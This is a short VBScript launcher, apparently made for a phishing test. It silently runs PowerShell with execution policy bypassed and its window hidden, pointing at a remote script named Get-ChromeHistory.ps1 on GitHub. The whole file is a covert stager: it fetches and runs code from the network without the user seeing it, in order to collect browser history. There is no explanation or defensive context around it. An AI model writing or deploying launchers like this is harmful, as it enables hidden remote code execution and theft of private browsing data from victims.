Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File https://raw.githubusercontent.com/r0831281/phish_test/refs/heads/main/Get-ChromeHistory.ps1", 0, False
